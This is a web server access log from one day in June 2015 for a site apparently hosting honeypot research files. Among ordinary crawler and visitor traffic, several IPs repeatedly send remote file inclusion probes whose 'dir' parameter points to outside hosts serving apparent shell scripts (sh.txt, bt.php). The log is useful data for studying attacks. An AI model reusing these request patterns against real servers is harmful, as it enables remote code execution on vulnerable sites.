27.50.84.253 - - [22/Jun/2015:06:22:36 -0700] "GET /honeypot/Honeypot%20-%20Howto.pdf////bbs/skin/ggambo7002_board/setup.php?dir=http://www.arhip.net/.mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.64 Safari/537.31" 
27.50.84.253 - - [22/Jun/2015:06:22:37 -0700] "GET /honeypot/Honeypot%20-%20Howto.pdf////bbs/skin/ggambo7002_board/setup.php?dir=http://www.arhip.net/.mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.64 Safari/537.31" 
27.50.84.253 - - [22/Jun/2015:06:22:37 -0700] "POST /honeypot/Honeypot%20-%20Howto.pdf////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.64 Safari/537.31" 
27.50.84.253 - - [22/Jun/2015:06:22:39 -0700] "POST /honeypot/Honeypot%20-%20Howto.pdf////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.64 Safari/537.31" 
27.50.84.253 - - [22/Jun/2015:06:22:39 -0700] "GET ////bbs/skin/ggambo7002_board/setup.php?dir=http://www.arhip.net/.mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.64 Safari/537.31" 
27.50.84.253 - - [22/Jun/2015:06:22:41 -0700] "GET ////bbs/skin/ggambo7002_board/setup.php?dir=http://www.arhip.net/.mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.64 Safari/537.31" 
27.50.84.253 - - [22/Jun/2015:06:22:41 -0700] "POST ////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.64 Safari/537.31" 
27.50.84.253 - - [22/Jun/2015:06:22:43 -0700] "POST ////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.64 Safari/537.31" 
27.50.84.253 - - [22/Jun/2015:06:22:43 -0700] "GET /honeypot////bbs/skin/ggambo7002_board/setup.php?dir=http://www.arhip.net/.mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.64 Safari/537.31" 
27.50.84.253 - - [22/Jun/2015:06:22:45 -0700] "GET /honeypot////bbs/skin/ggambo7002_board/setup.php?dir=http://www.arhip.net/.mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.64 Safari/537.31" 
27.50.84.253 - - [22/Jun/2015:06:22:45 -0700] "POST /honeypot////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.64 Safari/537.31" 
27.50.84.253 - - [22/Jun/2015:06:22:46 -0700] "POST /honeypot////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.64 Safari/537.31" 
181.65.186.34 - - [22/Jun/2015:06:25:23 -0700] "GET ////bbs/skin/ggambo7002_board/setup.php?dir=http://www.yc57.com/.mods//sh.txt? HTTP/1.1" 404 295 "-" "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.7.6) Gecko/20050512 Firefox" 
181.65.186.34 - - [22/Jun/2015:06:25:24 -0700] "GET ////bbs/skin/ggambo7002_board/setup.php?dir=http://www.yc57.com/.mods//bt.php? HTTP/1.1" 404 294 "-" "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.7.6) Gecko/20050512 Firefox" 
181.65.186.34 - - [22/Jun/2015:06:25:24 -0700] "POST ////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 295 "-" "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.7.6) Gecko/20050512 Firefox" 
207.46.13.50 - - [22/Jun/2015:06:30:35 -0700] "GET / HTTP/1.1" 301 483 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
207.46.13.50 - - [22/Jun/2015:06:34:00 -0700] "GET / HTTP/1.1" 200 7043 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
181.65.186.34 - - [22/Jun/2015:06:40:34 -0700] "GET /honeypot/Honeypot%20-%20Howto.pdf//bbs/skin/zero_vote/ask_password.php?dir=http://www.yc57.com/.mods//sh.txt? HTTP/1.1" 404 295 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:21.0) Gecko/20100101 Firefox/21.0" 
181.65.186.34 - - [22/Jun/2015:06:40:35 -0700] "GET /honeypot/Honeypot%20-%20Howto.pdf//bbs/skin/zero_vote/ask_password.php?dir=http://www.yc57.com/.mods//bt.php? HTTP/1.1" 404 294 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:21.0) Gecko/20100101 Firefox/21.0" 
181.65.186.34 - - [22/Jun/2015:06:40:35 -0700] "POST /honeypot/Honeypot%20-%20Howto.pdf//bbs/skin/zero_vote/ask_password.php HTTP/1.1" 404 295 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:21.0) Gecko/20100101 Firefox/21.0" 
181.65.186.34 - - [22/Jun/2015:06:40:38 -0700] "POST /honeypot/Honeypot%20-%20Howto.pdf//bbs/skin/zero_vote/ask_password.php HTTP/1.1" 404 295 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:21.0) Gecko/20100101 Firefox/21.0" 
181.65.186.34 - - [22/Jun/2015:06:40:38 -0700] "GET //bbs/skin/zero_vote/ask_password.php?dir=http://www.yc57.com/.mods//sh.txt? HTTP/1.1" 404 294 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:21.0) Gecko/20100101 Firefox/21.0" 
181.65.186.34 - - [22/Jun/2015:06:40:39 -0700] "GET //bbs/skin/zero_vote/ask_password.php?dir=http://www.yc57.com/.mods//bt.php? HTTP/1.1" 404 294 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:21.0) Gecko/20100101 Firefox/21.0" 
181.65.186.34 - - [22/Jun/2015:06:40:42 -0700] "POST //bbs/skin/zero_vote/ask_password.php HTTP/1.1" 404 295 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:21.0) Gecko/20100101 Firefox/21.0" 
181.65.186.34 - - [22/Jun/2015:06:40:47 -0700] "POST //bbs/skin/zero_vote/ask_password.php HTTP/1.1" 404 295 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:21.0) Gecko/20100101 Firefox/21.0" 
181.65.186.34 - - [22/Jun/2015:06:40:47 -0700] "GET /honeypot//bbs/skin/zero_vote/ask_password.php?dir=http://www.yc57.com/.mods//sh.txt? HTTP/1.1" 404 294 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:21.0) Gecko/20100101 Firefox/21.0" 
181.65.186.34 - - [22/Jun/2015:06:40:54 -0700] "GET /honeypot//bbs/skin/zero_vote/ask_password.php?dir=http://www.yc57.com/.mods//bt.php? HTTP/1.1" 404 295 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:21.0) Gecko/20100101 Firefox/21.0" 
181.65.186.34 - - [22/Jun/2015:06:41:03 -0700] "POST /honeypot//bbs/skin/zero_vote/ask_password.php HTTP/1.1" 404 295 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:21.0) Gecko/20100101 Firefox/21.0" 
181.65.186.34 - - [22/Jun/2015:06:41:05 -0700] "POST /honeypot//bbs/skin/zero_vote/ask_password.php HTTP/1.1" 404 295 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:21.0) Gecko/20100101 Firefox/21.0" 
177.159.79.148 - - [22/Jun/2015:07:08:02 -0700] "GET / HTTP/1.1" 301 483 "http://100dollars-seo.com/try.php?u=http://secrepo.com" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.143 Safari/537.36" 
177.159.79.148 - - [22/Jun/2015:07:08:03 -0700] "GET / HTTP/1.1" 200 7043 "http://100dollars-seo.com/try.php?u=http://secrepo.com" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.143 Safari/537.36" 
177.159.79.148 - - [22/Jun/2015:07:08:03 -0700] "GET /twitter-icon.png HTTP/1.1" 200 27787 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.143 Safari/537.36" 
177.159.79.148 - - [22/Jun/2015:07:08:04 -0700] "GET /GitHub-Mark.png HTTP/1.1" 200 7428 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.143 Safari/537.36" 
181.65.186.34 - - [22/Jun/2015:07:11:13 -0700] "GET /honeypot/Honeypot%20-%20Howto.pdf////bbs/skin/ggambo7002_board/setup.php?dir=http://www.yc57.com/.mods//sh.txt? HTTP/1.1" 404 295 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:21.0) Gecko/20100101 Firefox/21.0" 
181.65.186.34 - - [22/Jun/2015:07:11:15 -0700] "GET /honeypot/Honeypot%20-%20Howto.pdf////bbs/skin/ggambo7002_board/setup.php?dir=http://www.yc57.com/.mods//bt.php? HTTP/1.1" 404 294 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:21.0) Gecko/20100101 Firefox/21.0" 
181.65.186.34 - - [22/Jun/2015:07:11:15 -0700] "POST /honeypot/Honeypot%20-%20Howto.pdf////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 295 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:21.0) Gecko/20100101 Firefox/21.0" 
181.65.186.34 - - [22/Jun/2015:07:11:16 -0700] "POST /honeypot/Honeypot%20-%20Howto.pdf////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 295 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:21.0) Gecko/20100101 Firefox/21.0" 
181.65.186.34 - - [22/Jun/2015:07:11:16 -0700] "GET ////bbs/skin/ggambo7002_board/setup.php?dir=http://www.yc57.com/.mods//sh.txt? HTTP/1.1" 404 294 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:21.0) Gecko/20100101 Firefox/21.0" 
181.65.186.34 - - [22/Jun/2015:07:11:17 -0700] "GET ////bbs/skin/ggambo7002_board/setup.php?dir=http://www.yc57.com/.mods//bt.php? HTTP/1.1" 404 294 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:21.0) Gecko/20100101 Firefox/21.0" 
181.65.186.34 - - [22/Jun/2015:07:11:18 -0700] "POST ////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 295 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:21.0) Gecko/20100101 Firefox/21.0" 
181.65.186.34 - - [22/Jun/2015:07:11:19 -0700] "POST ////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 295 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:21.0) Gecko/20100101 Firefox/21.0" 
181.65.186.34 - - [22/Jun/2015:07:11:19 -0700] "GET /honeypot////bbs/skin/ggambo7002_board/setup.php?dir=http://www.yc57.com/.mods//sh.txt? HTTP/1.1" 404 294 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:21.0) Gecko/20100101 Firefox/21.0" 
181.65.186.34 - - [22/Jun/2015:07:11:20 -0700] "GET /honeypot////bbs/skin/ggambo7002_board/setup.php?dir=http://www.yc57.com/.mods//bt.php? HTTP/1.1" 404 294 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:21.0) Gecko/20100101 Firefox/21.0" 
181.65.186.34 - - [22/Jun/2015:07:11:20 -0700] "POST /honeypot////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 295 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:21.0) Gecko/20100101 Firefox/21.0" 
181.65.186.34 - - [22/Jun/2015:07:11:22 -0700] "POST /honeypot////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 295 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:21.0) Gecko/20100101 Firefox/21.0" 
188.165.15.29 - - [22/Jun/2015:07:13:59 -0700] "GET /self.logs/error.log.2015-06-10.gz HTTP/1.1" 200 790 "-" "Mozilla/5.0 (compatible; AhrefsBot/5.0; +http://ahrefs.com/robot/)" 
8.28.16.254 - - [22/Jun/2015:07:15:45 -0700] "GET / HTTP/1.1" 200 23010 "-" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; InfoPath.1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; MS-RTC LM 8; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)" 
20.137.2.50 - - [22/Jun/2015:07:15:45 -0700] "GET / HTTP/1.1" 200 7043 "http://www2.mlsecproject.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:38.0) Gecko/20100101 Firefox/38.0" 
188.165.15.29 - - [22/Jun/2015:07:19:18 -0700] "GET /self.logs/access.log.2015-06-05.gz HTTP/1.1" 200 4046 "-" "Mozilla/5.0 (compatible; AhrefsBot/5.0; +http://ahrefs.com/robot/)" 
199.19.249.196 - - [22/Jun/2015:07:41:42 -0700] "GET / HTTP/1.1" 200 23010 "-" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; InfoPath.1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; MS-RTC LM 8; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)" 
193.127.190.21 - - [22/Jun/2015:07:41:42 -0700] "GET / HTTP/1.1" 200 23010 "http://www2.mlsecproject.org/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.111 Safari/537.36" 
193.127.190.21 - - [22/Jun/2015:07:41:42 -0700] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 590 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.111 Safari/537.36" 
193.127.190.21 - - [22/Jun/2015:07:41:42 -0700] "GET /GitHub-Mark.png HTTP/1.1" 200 7428 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.111 Safari/537.36" 
193.127.190.21 - - [22/Jun/2015:07:41:42 -0700] "GET /twitter-icon.png HTTP/1.1" 200 27788 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.111 Safari/537.36" 
181.65.186.34 - - [22/Jun/2015:07:52:11 -0700] "GET /honeypot//bbs/skin/zero_vote/ask_password.php?dir=http://www.yc57.com/.mods//sh.txt? HTTP/1.1" 404 295 "-" "Mozilla/5.0 (Windows NT 5.1; rv:6.0.2) Gecko/20100101 Firefox/6.0.2" 
181.65.186.34 - - [22/Jun/2015:07:52:12 -0700] "GET /honeypot//bbs/skin/zero_vote/ask_password.php?dir=http://www.yc57.com/.mods//bt.php? HTTP/1.1" 404 294 "-" "Mozilla/5.0 (Windows NT 5.1; rv:6.0.2) Gecko/20100101 Firefox/6.0.2" 
181.65.186.34 - - [22/Jun/2015:07:52:12 -0700] "POST /honeypot//bbs/skin/zero_vote/ask_password.php HTTP/1.1" 404 295 "-" "Mozilla/5.0 (Windows NT 5.1; rv:6.0.2) Gecko/20100101 Firefox/6.0.2" 
181.65.186.34 - - [22/Jun/2015:07:52:13 -0700] "POST /honeypot//bbs/skin/zero_vote/ask_password.php HTTP/1.1" 404 295 "-" "Mozilla/5.0 (Windows NT 5.1; rv:6.0.2) Gecko/20100101 Firefox/6.0.2" 
181.65.186.34 - - [22/Jun/2015:07:52:14 -0700] "GET //bbs/skin/zero_vote/ask_password.php?dir=http://www.yc57.com/.mods//sh.txt? HTTP/1.1" 404 294 "-" "Mozilla/5.0 (Windows NT 5.1; rv:6.0.2) Gecko/20100101 Firefox/6.0.2" 
181.65.186.34 - - [22/Jun/2015:07:52:15 -0700] "GET //bbs/skin/zero_vote/ask_password.php?dir=http://www.yc57.com/.mods//bt.php? HTTP/1.1" 404 294 "-" "Mozilla/5.0 (Windows NT 5.1; rv:6.0.2) Gecko/20100101 Firefox/6.0.2" 
181.65.186.34 - - [22/Jun/2015:07:52:15 -0700] "POST //bbs/skin/zero_vote/ask_password.php HTTP/1.1" 404 295 "-" "Mozilla/5.0 (Windows NT 5.1; rv:6.0.2) Gecko/20100101 Firefox/6.0.2" 
181.65.186.34 - - [22/Jun/2015:07:52:16 -0700] "POST //bbs/skin/zero_vote/ask_password.php HTTP/1.1" 404 295 "-" "Mozilla/5.0 (Windows NT 5.1; rv:6.0.2) Gecko/20100101 Firefox/6.0.2" 
194.244.43.243 - - [22/Jun/2015:08:19:52 -0700] "GET / HTTP/1.1" 200 7043 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/600.6.3 (KHTML, like Gecko) Version/8.0.6 Safari/600.6.3" 
194.244.43.243 - - [22/Jun/2015:08:19:52 -0700] "GET /twitter-icon.png HTTP/1.1" 200 27787 "http://www.secrepo.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/600.6.3 (KHTML, like Gecko) Version/8.0.6 Safari/600.6.3" 
194.244.43.243 - - [22/Jun/2015:08:19:52 -0700] "GET /GitHub-Mark.png HTTP/1.1" 200 7428 "http://www.secrepo.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/600.6.3 (KHTML, like Gecko) Version/8.0.6 Safari/600.6.3" 
91.253.18.232 - - [22/Jun/2015:08:20:46 -0700] "GET /favicon.ico HTTP/1.1" 301 501 "-" "Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_0 like Mac OS X; en-us) AppleWebKit/532.9 (KHTML, like Gecko) Version/4.0.5 Mobile/8A293 Safari/6531.22.7" 
91.253.18.232 - - [22/Jun/2015:08:20:48 -0700] "GET /favicon.ico HTTP/1.1" 200 268 "-" "Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_0 like Mac OS X; en-us) AppleWebKit/532.9 (KHTML, like Gecko) Version/4.0.5 Mobile/8A293 Safari/6531.22.7" 
146.199.141.195 - - [22/Jun/2015:08:45:25 -0700] "GET / HTTP/1.1" 301 483 "http://semaltmedia.com" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.143 Safari/537.36" 
146.199.141.195 - - [22/Jun/2015:08:45:25 -0700] "GET / HTTP/1.1" 200 7043 "http://semaltmedia.com" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.143 Safari/537.36" 
146.199.141.195 - - [22/Jun/2015:08:45:25 -0700] "GET /twitter-icon.png HTTP/1.1" 200 27787 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.143 Safari/537.36" 
146.199.141.195 - - [22/Jun/2015:08:45:25 -0700] "GET /GitHub-Mark.png HTTP/1.1" 200 7428 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.143 Safari/537.36" 
188.165.15.29 - - [22/Jun/2015:09:17:55 -0700] "GET /self.logs/error.log.2015-06-02.gz HTTP/1.1" 200 762 "-" "Mozilla/5.0 (compatible; AhrefsBot/5.0; +http://ahrefs.com/robot/)" 
188.165.15.29 - - [22/Jun/2015:09:34:43 -0700] "GET /self.logs/access.log.2015-06-10.gz HTTP/1.1" 200 6330 "-" "Mozilla/5.0 (compatible; AhrefsBot/5.0; +http://ahrefs.com/robot/)" 
108.171.131.163 - - [22/Jun/2015:09:39:56 -0700] "GET / HTTP/1.1" 200 7043 "http://www2.mlsecproject.org/" "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0;  rv:11.0) like Gecko" 
108.171.131.163 - - [22/Jun/2015:09:39:56 -0700] "GET /twitter-icon.png HTTP/1.1" 200 27787 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0;  rv:11.0) like Gecko" 
108.171.131.163 - - [22/Jun/2015:09:39:56 -0700] "GET /GitHub-Mark.png HTTP/1.1" 200 7428 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0;  rv:11.0) like Gecko" 
108.171.131.163 - - [22/Jun/2015:09:40:01 -0700] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 590 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0;  rv:11.0) like Gecko" 
192.99.2.27 - - [22/Jun/2015:09:40:56 -0700] "GET /robots.txt HTTP/1.0" 200 252 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.5; http://www.majestic12.co.uk/bot.php?+)" 
192.99.2.27 - - [22/Jun/2015:09:41:03 -0700] "GET /honeypot/Honeypot HTTP/1.0" 404 284 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.5; http://www.majestic12.co.uk/bot.php?+)" 
45.56.106.83 - - [22/Jun/2015:10:06:34 -0700] "GET / HTTP/1.1" 301 498 "-" "Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36" 
45.56.106.83 - - [22/Jun/2015:10:06:34 -0700] "GET / HTTP/1.1" 200 23010 "http://www.secrepo.com/" "Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36" 
199.59.148.210 - - [22/Jun/2015:10:15:11 -0700] "GET /robots.txt HTTP/1.1" 200 304 "-" "Twitterbot/1.0" 
104.130.161.117 - - [22/Jun/2015:10:15:11 -0700] "GET /robots.txt HTTP/1.1" 301 446 "-" "Tornado-Async-Client" 
104.130.161.117 - - [22/Jun/2015:10:15:12 -0700] "GET /robots.txt HTTP/1.1" 200 304 "-" "Tornado-Async-Client" 
104.130.161.117 - - [22/Jun/2015:10:15:12 -0700] "GET /honeypot/BSidesDFW%20-%202014.ipynb HTTP/1.1" 301 484 "-" "Tornado-Async-Client" 
104.130.161.117 - - [22/Jun/2015:10:15:12 -0700] "GET /honeypot/BSidesDFW%20-%202014.ipynb HTTP/1.1" 200 930780 "-" "Tornado-Async-Client" 
199.59.148.211 - - [22/Jun/2015:10:15:13 -0700] "GET /robots.txt HTTP/1.1" 200 304 "-" "Twitterbot/1.0" 
199.59.148.211 - - [22/Jun/2015:10:15:13 -0700] "GET /robots.txt HTTP/1.1" 200 304 "-" "Twitterbot/1.0" 
199.59.148.210 - - [22/Jun/2015:10:15:11 -0700] "GET /honeypot/Honeypot%20-%20Howto%20-%20BSides%20Austin.pdf HTTP/1.1" 200 2928404 "-" "Twitterbot/1.0" 
199.59.148.211 - - [22/Jun/2015:10:15:13 -0700] "GET /honeypot/Honeypot%20-%20Howto.pdf HTTP/1.1" 200 1279362 "-" "Twitterbot/1.0" 
199.59.148.211 - - [22/Jun/2015:10:15:13 -0700] "GET /honeypot/honeypot.json.zip HTTP/1.1" 200 4631817 "-" "Twitterbot/1.0" 
207.46.13.50 - - [22/Jun/2015:10:44:56 -0700] "GET /self.logs/access.log.2015-05-19.gz HTTP/1.1" 200 4781 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
66.249.69.120 - - [22/Jun/2015:11:00:12 -0700] "GET /robots.txt HTTP/1.1" 200 334 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)" 
66.249.69.120 - - [22/Jun/2015:11:00:12 -0700] "GET / HTTP/1.1" 200 7042 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 6_0 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/6.0 Mobile/10A5376e Safari/8536.25 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)" 
75.87.153.253 - - [22/Jun/2015:11:05:30 -0700] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 590 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:38.0) Gecko/20100101 Firefox/38.0" 
192.34.240.11 - - [22/Jun/2015:11:20:20 -0700] "GET / HTTP/1.1" 301 483 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.124 Safari/537.36" 
192.34.240.11 - - [22/Jun/2015:11:20:21 -0700] "GET / HTTP/1.1" 200 7043 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.124 Safari/537.36" 
192.34.240.11 - - [22/Jun/2015:11:20:21 -0700] "GET /twitter-icon.png HTTP/1.1" 200 27787 "http://www.secrepo.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.124 Safari/537.36" 
192.34.240.11 - - [22/Jun/2015:11:20:21 -0700] "GET /GitHub-Mark.png HTTP/1.1" 200 7428 "http://www.secrepo.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.124 Safari/537.36" 
192.34.240.11 - - [22/Jun/2015:11:20:21 -0700] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 589 "http://www.secrepo.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.124 Safari/537.36" 
199.167.112.5 - - [22/Jun/2015:11:46:02 -0700] "GET / HTTP/1.1" 200 7043 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.124 Safari/537.36" 
199.167.112.5 - - [22/Jun/2015:11:46:02 -0700] "GET /GitHub-Mark.png HTTP/1.1" 200 7428 "http://www.secrepo.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.124 Safari/537.36" 
199.167.112.5 - - [22/Jun/2015:11:46:02 -0700] "GET /twitter-icon.png HTTP/1.1" 200 27787 "http://www.secrepo.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.124 Safari/537.36" 
199.167.112.5 - - [22/Jun/2015:11:46:03 -0700] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 589 "http://www.secrepo.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.124 Safari/537.36" 
87.117.189.201 - - [22/Jun/2015:12:08:22 -0700] "GET /honeypot/BSidesDFW%20-%202014.ipynb HTTP/1.0" 200 930799 "http://www.secrepo.com/honeypot/BSidesDFW%20-%202014.ipynb" "Mozilla/5.0 (Windows NT 6.1; rv:37.0) Gecko/20100101 Firefox/37.0" 
199.167.112.5 - - [22/Jun/2015:12:30:08 -0700] "GET / HTTP/1.1" 304 189 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.124 Safari/537.36" 
199.59.148.211 - - [22/Jun/2015:12:33:26 -0700] "GET /robots.txt HTTP/1.1" 200 304 "-" "Twitterbot/1.0" 
199.59.148.210 - - [22/Jun/2015:12:33:26 -0700] "GET /robots.txt HTTP/1.1" 200 304 "-" "Twitterbot/1.0" 
199.59.148.211 - - [22/Jun/2015:12:33:26 -0700] "GET /honeypot/Honeypot%20-%20Howto%20-%20BSides%20Austin.pdf HTTP/1.1" 200 2928404 "-" "Twitterbot/1.0" 
199.59.148.210 - - [22/Jun/2015:12:33:26 -0700] "GET /honeypot/honeypot.json.zip HTTP/1.1" 200 4631817 "-" "Twitterbot/1.0" 
98.224.3.67 - - [22/Jun/2015:12:34:25 -0700] "GET / HTTP/1.1" 200 7043 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/600.6.3 (KHTML, like Gecko) Version/8.0.6 Safari/600.6.3" 
